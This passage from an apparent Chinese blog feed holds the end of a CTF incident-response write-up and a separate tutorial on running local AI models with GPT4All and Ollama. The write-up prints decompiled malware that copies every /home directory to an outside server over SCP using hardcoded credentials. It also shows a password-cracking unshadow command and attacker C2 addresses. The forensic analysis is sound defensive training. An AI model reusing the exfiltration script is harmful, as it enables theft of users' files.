class="line"></span><br><span class="line"><span class="built_in">print</span>(custom_decrypt(<span class="string">&quot;c3a1c3c13e326020c3919093e1260525045e&quot;</span>, <span class="string">&quot;MySecretKey&quot;</span>))</span><br><span class="line"><span class="comment"># palu&#123;Password-000&#125;</span></span><br></pre></td></tr></table></figure><h3 id="应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交"><a href="#应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交" class="headerlink" title="应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交"></a>应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交</h3><p><code>palu&#123;svhost&#125;</code></p><p>还记得前面17题找到的恶意软件吗，就是他</p><h3 id="应急响应2-25-提交恶意程序的外联地址"><a href="#应急响应2-25-提交恶意程序的外联地址" class="headerlink" title="应急响应2-25 提交恶意程序的外联地址"></a>应急响应2-25 提交恶意程序的外联地址</h3><p><code>palu&#123;88.173.90.103&#125;</code></p><p>在近源机器机器中还有一个恶意程序，在Parloo用户的家目录下名称为<code>ifconfig.exe</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-72.png"></p><p>一个经典Pyinstaller打包的Python程序，逆向出来后即可看到外连IP</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-73.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: 恶意程序1.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.8.0rc1+ (3413)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> scp <span class="keyword">import</span> SCPClient</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssh_client</span>(<span class="params">server, port, username, password=<span class="literal">None</span>, key_path=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建SSH客户端连接</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> key_path:</span><br><span class="line">            private_key = paramiko.RSAKey.from_private_key_file(key_path)</span><br><span class="line">            client.connect(server, port, username, pkey=private_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            client.connect(server, port, username, password)</span><br><span class="line">        <span class="keyword">return</span> client</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;连接错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transfer_directory</span>(<span class="params">scp, local_path, remote_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    递归传输目录</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(local_path):</span><br><span class="line">        local_item = os.path.join(local_path, item)</span><br><span class="line">        <span class="keyword">if</span> os.path.islink(local_item):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;跳过符号链接: <span class="subst">&#123;local_item&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        remote_item = os.path.join(remote_path, item)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(local_item):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                scp.mkdir(remote_item)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            transfer_directory(scp, local_item, remote_item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;传输文件中: <span class="subst">&#123;local_item&#125;</span>&#x27;</span>)</span><br><span class="line">            scp.put(local_item, remote_item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ssh_config = &#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;88.173.90.103&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ubuntu&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;OOWPWPWADADA&#x27;</span>&#125;</span><br><span class="line">    local_home = <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">    remote_base = <span class="string">&#x27;/home/ubuntu/backup_home&#x27;</span></span><br><span class="line">    ssh = create_ssh_client(**ssh_config)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ssh:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> SCPClient(ssh.get_transport()) <span class="keyword">as</span> scp:</span><br><span class="line">            Path(local_home).mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            transfer_directory(scp, local_home, remote_base)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;传输完成&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;传输错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        ssh.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="应急响应2-26-提交攻击这使用的恶意dnslog域名作为flag进行提交"><a href="#应急响应2-26-提交攻击这使用的恶意dnslog域名作为flag进行提交" class="headerlink" title="应急响应2-26 提交攻击这使用的恶意dnslog域名作为flag进行提交"></a>应急响应2-26 提交攻击这使用的恶意dnslog域名作为flag进行提交</h3><p><code>palu&#123;np85qqde.requestrepo.com&#125;</code></p><p>还记得前面第20题找到的<code>command.log</code>日志文件吗</p><p>在日志里面就可以找到</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-74.png"></p><h3 id="应急响应2-27-提交寻找反序列化漏洞的端口作为flag进行提交"><a href="#应急响应2-27-提交寻找反序列化漏洞的端口作为flag进行提交" class="headerlink" title="应急响应2-27 提交寻找反序列化漏洞的端口作为flag进行提交"></a>应急响应2-27 提交寻找反序列化漏洞的端口作为flag进行提交</h3><p><code>palu&#123;9999&#125;</code></p><p>在WAF中筛选具有反序列化攻击的流量</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-75.png"></p><p>就这段流量是响应302，其他都是响应404或400</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-76.png"></p><h3 id="应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接"><a href="#应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接" class="headerlink" title="应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接"></a>应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接</h3><p><code>palu&#123;QZYysgMYhG6/CzIJlVpR2g==&#125;</code></p><p>在WAF的防护应用可以看到<code>192.168.20.102:9999</code>是代理了<code>192.168.20.103:9999</code>的服务</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-77.png"></p><p>然而在对应的1Panel管理面板中并没有看到开启了端口为9999的站点</p><p>使用ss命令查看Server服务器网络情况，并根据PID找到占用9999端口的程序</p><p>不用ss命令也可以装net-tools用netstat命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss -anotp | grep <span class="string">&quot;9999&quot;</span></span><br><span class="line">ps -ef | grep <span class="string">&quot;844&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-78.png"></p><p>可以找到占用的程序为<code>/opt/adminAF.jar</code></p><p>拉出来用<code>Java Decompiler</code>看源码就能找到泄露的密钥</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-79.png"></p><h3 id="应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交"><a href="#应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交" class="headerlink" title="应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交"></a>应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交</h3><p>找了很多师傅的WP都没看到正确答案故后续等官方WP</p><h3 id="应急响应2-30-提交攻击者在server中留下的账户密码作为flag进行提交"><a href="#应急响应2-30-提交攻击者在server中留下的账户密码作为flag进行提交" class="headerlink" title="应急响应2-30 提交攻击者在server中留下的账户密码作为flag进行提交"></a>应急响应2-30 提交攻击者在server中留下的账户密码作为flag进行提交</h3><p><code>palu&#123;parloohack/123456&#125;</code></p><p>查看<code>/etc/passwd</code>可以看到攻击者留下的账号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-80.png"></p><p>合并/etc/passwd和/etc/shadow文件然后用john爆破就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-81.png"></p><h3 id="应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交"><a href="#应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交" class="headerlink" title="应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交"></a>应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交</h3><p><code>palu&#123;parloohack_script.service&#125;</code></p><p>在server机中切换到<code>parloohack</code>用户查看执行命令的历史记录中可以看到</p><p>攻击者新增并启动了一个特别的服务，还增加了自启动</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-82.png"></p><p>查看该服务可以发现启动了<code>/home/parloohack/python3.3.py</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-83.png"></p><p>继续分析<code>/home/parloohack/python3.3.py</code>发现是很明显的维权方法</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-84.png"></p><p>所以flag就是<code>parloohack_script.service</code></p><h3 id="应急响应2-32-提交攻击者留下的木马md5后作为flag进行提交"><a href="#应急响应2-32-提交攻击者留下的木马md5后作为flag进行提交" class="headerlink" title="应急响应2-32 提交攻击者留下的木马md5后作为flag进行提交"></a>应急响应2-32 提交攻击者留下的木马md5后作为flag进行提交</h3><p><code>palu&#123;4123940b3911556d4bf79196cc008bf4&#125;</code></p><p>在<code>parloohack</code>用户的家目录下可以看到一个特殊的文件<code>aa</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-85.png"></p><p>扔沙箱就可以发现是木马</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-86.png"></p><h3 id="应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交"><a href="#应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交" class="headerlink" title="应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交"></a>应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交</h3><p><code>palu&#123;X5E1yklz1oAdyHBZ&#125;</code></p><p>在PC2的浏览器的密码管理器中可以找到攻击者留下的溯源信息（这是真没想到）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-87.png"></p><h3 id="应急响应2-34（复现）提交攻击者的githubID作为flag进行提交"><a href="#应急响应2-34（复现）提交攻击者的githubID作为flag进行提交" class="headerlink" title="应急响应2-34（复现）提交攻击者的githubID作为flag进行提交"></a>应急响应2-34（复现）提交攻击者的githubID作为flag进行提交</h3><p><code>palu&#123;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc&lt;/font&gt;&#125;</code></p><p>这个用户登录的账号是一个QQ号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-88.png"></p><p>去他的QQ空间中查看就可以知道Github的ID为<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc来点str吧&lt;/font&gt;</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-89.png"></p><p>但是找不到用户为<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc来点str吧&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">直到试了</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc&lt;/font&gt;</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-90.png"></p><h3 id="应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交"><a href="#应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交" class="headerlink" title="应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交"></a>应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交</h3><p><code>palu&#123;s5o3WkX33hptyJjk&#125;</code></p><p>在GitHub中看他的<code>fffflllgggg</code>项目就可以看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-91.png"></p><h3 id="应急响应2-36-提交恶意用户的数量作为flag进行提交"><a href="#应急响应2-36-提交恶意用户的数量作为flag进行提交" class="headerlink" title="应急响应2-36 提交恶意用户的数量作为flag进行提交"></a>应急响应2-36 提交恶意用户的数量作为flag进行提交</h3><p><code>palu&#123;99&#125;</code></p><p>进不去虚拟机是正常的，被攻击者改了密码，可以参考该文章清掉密码：</p><p><a href="https://blog.csdn.net/weixin_52244898/article/details/138998529">https://blog.csdn.net/weixin_52244898/article/details/138998529</a></p><p>打开PC01的显示隐藏文件夹即可在C盘看到一个脚本，里面创建了99个恶意用户</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-92.png"></p><h3 id="应急响应2-37-提交恶意用户的默认密码作为flag进行提交"><a href="#应急响应2-37-提交恶意用户的默认密码作为flag进行提交" class="headerlink" title="应急响应2-37 提交恶意用户的默认密码作为flag进行提交"></a>应急响应2-37 提交恶意用户的默认密码作为flag进行提交</h3><p><code>palu&#123;123456&#125;</code></p><p>在上一题即可看到都是默认密码为123456</p><h3 id="应急响应2-38-提交业务数据中攻击者留下的信息作为flag进行提交"><a href="#应急响应2-38-提交业务数据中攻击者留下的信息作为flag进行提交" class="headerlink" title="应急响应2-38 提交业务数据中攻击者留下的信息作为flag进行提交"></a>应急响应2-38 提交业务数据中攻击者留下的信息作为flag进行提交</h3><p><code>palu&#123;crP1ZIVfqrkfdhGy&#125;</code></p><p>我是直接在server服务器中的1Panel面板中备份整个数据库下载下来然后搜索palu抢到三血的</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-93.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-94.png"></p><h3 id="应急响应2-39-提交私人git仓库中留下的内容作为flag进行提交"><a href="#应急响应2-39-提交私人git仓库中留下的内容作为flag进行提交" class="headerlink" title="应急响应2-39 提交私人git仓库中留下的内容作为flag进行提交"></a>应急响应2-39 提交私人git仓库中留下的内容作为flag进行提交</h3><p><code>palu&#123;FO65SruuTukdpBS5&#125;</code></p><p>在gitea的palu仓库里</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-95.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-96.png"></p><h3 id="应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交"><a href="#应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交" class="headerlink" title="应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交"></a>应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</h3><p><code>palu&#123;ba7c9fc1ff58b48d0df5c88d2fcc5cd1&#125;</code></p><p>找了我大半天，结果就是被我扔到沙箱中检测不出恶意的<code>.a</code>文件（哭死）</p><p>在root用户的历史命令记录中可以看到一直在编辑<code>.a</code>文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-97.png"></p><p>全局搜索找到该文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-98.png"></p><p>我把程序扔到云沙箱中检测不到恶意所以我直接忽略了这个文件（看来不能完全相信沙箱的检测结果 哭）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-99.png"></p><h3 id="应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交"><a href="#应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交" class="headerlink" title="应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交"></a>应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交</h3><p><code>palu&#123;simulate_network_communication&#125;</code></p><p>扔进IDA就发现了为什么沙箱检测为安全了，全是模拟的函数（他真的我哭死）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-100.png"></p><p>模拟通讯的函数就是<code>simulate_network_communication</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-101.png"></p><h3 id="应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交"><a href="#应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交" class="headerlink" title="应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交"></a>应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交</h3><p><code>palu&#123;.malware_log.txt&#125;</code></p><p>在<code>create_hidden_file</code>函数里面</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-102.png"></p><h3 id="应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交"><a href="#应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交" class="headerlink" title="应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交"></a>应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交</h3><p><code>palu&#123;simulate_privilege_escalation&#125;</code></p><p>就是函数<code>simulate_privilege_escalation</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-103.png"></p><p>吐槽：白给4题我真服了<del>_</del></p><h3 id="应急响应2-44-提交被钓鱼上线的用户名作为flag进行提交"><a href="#应急响应2-44-提交被钓鱼上线的用户名作为flag进行提交" class="headerlink" title="应急响应2-44 提交被钓鱼上线的用户名作为flag进行提交"></a>应急响应2-44 提交被钓鱼上线的用户名作为flag进行提交</h3><p><code>palu&#123;Parloo-子怡&#125;</code></p><p>在内网通的聊天记录中可以看到PC01是单独给PC02发了一个恶意程序的</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-104.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-105.png"></p><h3 id="应急响应2-45-提交恶意程序的所在路径作为flag进行提交"><a href="#应急响应2-45-提交恶意程序的所在路径作为flag进行提交" class="headerlink" title="应急响应2-45 提交恶意程序的所在路径作为flag进行提交"></a>应急响应2-45 提交恶意程序的所在路径作为flag进行提交</h3><p><code>palu&#123;C:\Users\Public\Nwt\cache\recv\Parloo-沉沉&#125;</code></p><p>看上一题就能知道路径</p><h3 id="应急响应2-46-分析恶意程序的反连地址作为flag进行提交"><a href="#应急响应2-46-分析恶意程序的反连地址作为flag进行提交" class="headerlink" title="应急响应2-46 分析恶意程序的反连地址作为flag进行提交"></a>应急响应2-46 分析恶意程序的反连地址作为flag进行提交</h3><p><code>palu&#123;47.101.213.153&#125;</code></p><p>还记得在前面33题找到保存了的账号密码吗，保存的就是恶意程序的反连地址的账号于密码</p><p>因为这个恶意程序加了UPX的壳，还只能手工脱壳且在会检测云沙箱环境，作者比较菜所以没有手工脱壳分析</p><p>所以我是放在物理机中运行恶意程序然后用火绒安全工具获得的反连地址（危险操作请勿模仿）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-106.png"></p><p>正确操作</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-107.png"></p><h3 id="应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交"><a href="#应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交" class="headerlink" title="应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交"></a>应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交</h3><p><code>palu&#123;admin/admin@qwer&#125;</code></p><p>就是浏览器保存的C2地址中的账号密码</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-108.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地AI大模型部署</title>
      <link href="/blog/2024/09/27/04/"/>
      <url>/blog/2024/09/27/04/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一次本地AI大模型的部署"><a href="#记录一次本地AI大模型的部署" class="headerlink" title="记录一次本地AI大模型的部署"></a>记录一次本地AI大模型的部署</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人使用的设备的配置是</p><p>系统：Windows11</p><p>CPU：13th Gen Intel(R) Core(TM) i5-13500HX</p><p>内存：16G</p><p>显卡：NVIDIA GeForce RTX 4060 Laptop GPU</p><h2 id="方法一：GPT4All"><a href="#方法一：GPT4All" class="headerlink" title="方法一：GPT4All"></a>方法一：GPT4All</h2><p>优点：全程可视化UI操作，不需要敲命令，只需要安装一个软件即可完成后续的大模型的下载和使用，</p><p>缺点：内存占用偏高，在对话的交互上我用的不太舒服，就比如代码的复制粘贴没有像ChatGPT网页版中有个按钮点击就能复制，反而要手动选择后才能复制（后续软件可能会优化）</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-0.png"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>前往官网下载软件</p><p><a href="https://gpt4all.io/index.html?ref=localhost">GPT4All</a></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-1.png"></p><p>无脑一键安装就可以了，安装路径这里可以改，我这里直接全部默认了</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-2.png"></p><p>组件默认</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-3.png"></p><p>等待下载安装完成即可</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-4.png"></p><h3 id="模型下载"><a href="#模型下载" class="headerlink" title="模型下载"></a>模型下载</h3><p><strong>可选：可以先去设置里面调整模型的下载目录，否则软件默认把大模型下载到C盘</strong></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-5.png"></p><p>设置完成后点击模型，然后点击添加模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-6.png"></p><p>选择一个模型点击下载即可</p><p><strong><font style="color:#DF2A3F;">注：有时可能无法加载模型列表，科学一下再重新打开软件即可，加载出列表就能关了，下载模型时不需要挂着</font></strong></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-7.png"></p><h3 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h3><p>下载完后，点击对话，然后点击载入刚才下载的模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-8.png"></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-9.png"></p><p>等载入完成后即可开始使用</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-10.png"></p><h2 id="方法二（推荐）：Ollama-Vscode插件Continue"><a href="#方法二（推荐）：Ollama-Vscode插件Continue" class="headerlink" title="方法二（推荐）：Ollama+Vscode插件Continue"></a>方法二（推荐）：Ollama+Vscode插件Continue</h2><p>优点：内存占用偏低，可以用CMD窗口直接执行命令启动，在日常交互使用上我觉得比GPT4All要好很多，而且生成的速度略快于GPT4All</p><p>缺点：需要使用命令行进行模型下载，软件默认只能装C盘</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-11.png"></p><p>现在开始教程</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>前往官网下载Ollama</p><p><a href="https://ollama.com/download/windows">Download Ollama on Windows</a></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-12.png"></p><p>软件安装非常简单，没有任何配置点击安装即可（强制默认安装C盘）</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-13.png"></p><p>出现一下弹窗证明安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-14.png"></p><p>打开命令窗口输入<code>ollama -v</code>出现版本号</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-15.png"></p><h3 id="模型下载-1"><a href="#模型下载-1" class="headerlink" title="模型下载"></a>模型下载</h3><p><strong>可选：</strong><strong><font style="color:rgb(0, 0, 0);">修改模型下载路径</font></strong></p><p><font style="color:rgb(0, 0, 0);">默认模型下载路径：</font><code>C:\Users\用户\.ollama\models</code><br><font style="color:rgb(0, 0, 0);">添加系统变量修改模型默认下载路径<br></font><font style="color:rgb(0, 0, 0);">变量名：OLLAMA_MODELS</font></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-16.png"></p><p><font style="color:rgb(0, 0, 0);"></font></p><p>还是前往ollama的官网</p><p>在搜索栏搜索想要下载的大模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-17.png"></p><p>这里用qwen2.5为例，假设我想要下载这个模型，复制运行命令</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-18.png"></p><p>然后在CMD执行，等他下载完成</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-19.png"></p><p>也可以手动导入本地大模型</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/obullxl/p/18295202/NTopic2024071001">Ollama完整教程：本地LLM管理、WebUI对话、Python/Java客户端API应用 - 老牛啊 - 博客园 (cnblogs.com)</a></p><p>首先新建一个文件，命名为Modelfile，内容为：FROM 模型的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 配置文件</span><br><span class="line">FROM ./Meta-Llama-3-8B-Instruct.Q4_K_M.gguf</span><br></pre></td></tr></table></figure><p>然后在CMD命令窗口输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 导入命令</span><br><span class="line">ollama create 模型名称 -f ./Modelfile</span><br><span class="line"></span><br><span class="line">// 运行命令</span><br><span class="line">ollama run 模型名称</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2024/9/27/image-20.png"></p><h3 id="安装Vscode插件Continue"><a href="#安装Vscode插件Continue" class="headerlink" title="安装Vscode插件Continue"></a>安装Vscode插件Continue</h3><p>一图流演示安装过程</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-21.png"></p><p>在配置文件中填写以下配置并保存</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qwen2.5:latest&quot;</span><span class="punctuation">,</span> <span class="comment">// 模型名称</span></span><br><span class="line">  <span class="attr">&quot;provider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ollama&quot;</span><span class="punctuation">,</span> <span class="comment">// 运行程序</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qwen2.5&quot;</span> <span class="comment">// 模型名称</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2024/9/27/image-22.png"></p><h3 id="开始使用-1"><a href="#开始使用-1" class="headerlink" 